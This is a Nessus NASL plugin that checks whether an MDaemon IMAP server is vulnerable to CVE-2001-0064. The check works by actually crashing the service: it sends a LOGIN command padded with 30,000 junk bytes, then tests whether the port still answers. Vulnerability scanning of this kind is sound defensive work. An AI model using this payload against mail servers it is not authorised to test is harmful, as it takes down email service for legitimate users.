#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: Peter <peter.grundl@defcom.com>
#
#  This script is released under the GNU GPL v2

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (6/19/09)


include("compat.inc");

if(description)
{
 script_id(14826);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-2001-0064");
 script_bugtraq_id(2134);
 script_xref(name:"OSVDB", value:"12041");
 
 script_name(english:"MDaemon Webconfig IMAP Malformed URL DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a denial-of-service 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the MDaemon IMAP server.

It is possible to crash the remote version of this software sending a 
long argument to the 'LOGIN' command.

This problem allows an attacker to make the remote service crash, 
thus preventing legitimate users from receiving e-mails." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-12/0315.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Crashes the remote imap server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"Windows");
 script_dependencie("find_service1.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/imap");
if(!port)port = 143;

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((acct == "")||(pass == ""))exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    banner = recv_line(socket:soc, length:4096);
    if ("MDaemon" >!< banner ) exit(0);
    s = string("? LOGIN ", acct, " ", pass, " ", crap(30000), "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
    close(soc);
  
    soc2 = open_sock_tcp(port);
    if(!soc2)security_warning(port);
    else close(soc2);
 }
}
